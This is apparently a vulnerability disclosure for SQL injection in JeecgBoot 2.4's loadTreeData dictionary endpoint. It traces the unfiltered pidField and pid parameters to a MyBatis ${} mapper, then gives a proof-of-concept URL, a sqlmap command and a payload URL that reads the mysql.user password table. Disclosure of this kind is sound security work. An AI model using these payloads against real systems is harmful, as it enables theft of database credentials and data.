@@ -1,0 +1,63 @@
+#JeecgBoot 2.4
+#SQL Injection
+
+
+The vulnerability was discovered by downloading the program's source code to local and online deployment tests.   
+
+Location:
+src/main/java/org/jeecg/modules/system/controller/SysDictController.java
+
+Code analysis:
+7 parameters are defined in the `loadTreeData` method, and then use `ls` to receive the data processed by the `queryTreeList` method,
+Before calling the `queryTreeList` method to process the parameters, the `dictCode` is defined to call `filterContent` for the 4 parameters such as `tbname` for SQL injection vulnerability verification,
+But `pidField` and `pid` are omitted, follow up `queryTreeList` method:
+```bash
+src/main/java/org/jeecg/modules/system/service/ISysDictService.java
+```
+Here is the interface, follow up with the implementation class of the interface:implements ISysDictService.
+View the called `queryTreeList` method in the implementation class:
+```bash
+src/main/java/org/jeecg/modules/system/service/impl/SysDictServiceImpl.java
+```
+Pass the previously defined parameters into the `mapper` query, continue to follow up with `queryTreeList`:
+```bash
+src/main/java/org/jeecg/modules/system/mapper/SysDictMapper.java
+```
+Search `SysDictMapper.xml` globally and view the `select id` named `queryTreeList`:
+```bash
+src/main/java/org/jeecg/modules/system/mapper/xml/SysDictMapper.xml
+```
+In the sql statement here, `${}` is used for database operations and the parameters are controllable, resulting in injection.
+
+The matter is not over yet, because all the parameters are controllable. According to the writing in the 'mapper', the mysql statement is guessed as
+```mysql
+select x from x where x
+```
+So according to the writing of `mapper` combined with mysql characteristics, construct a url to read the mysql system table:
+http://localhost:8080/sys/dict/loadTreeData?pid=1&pidField=1&tableName=mysql.user&text=User&code=password&hasChildField=1&condition=
+
+
+Harm:
+Attackers can use vulnerabilities to obtain sensitive information in the database.
+
+Conditions for Execution:
+Need to use the registration interface `/register` under `SysUserController.java` to register an ordinary user
+
+Edition：     
+versions <= 2.4
+
+Cause the cause :
+src/main/java/org/jeecg/modules/system/mapper/xml/SysDictMapper.xml
+```java
+<select id ="queryTreeList"
+```
+ `${}` is used for database operations and the parameters are controllable, resulting in injection.  
+ 
+POC:
+http://localhost:8080/sys/dict/loadTreeData?pid=1&pidField=1&tableName=1&text=1&code=1&hasChildField=1&condition=1
+
+payload1:Use sqlmap for injection after login
+sqlmap -r 1.txt
+
+payload2:Query mysql system table
+http://localhost:8080/sys/dict/loadTreeData?pid=1&pidField=1&tableName=mysql.user&text=User&code=password&hasChildField=1&condition=
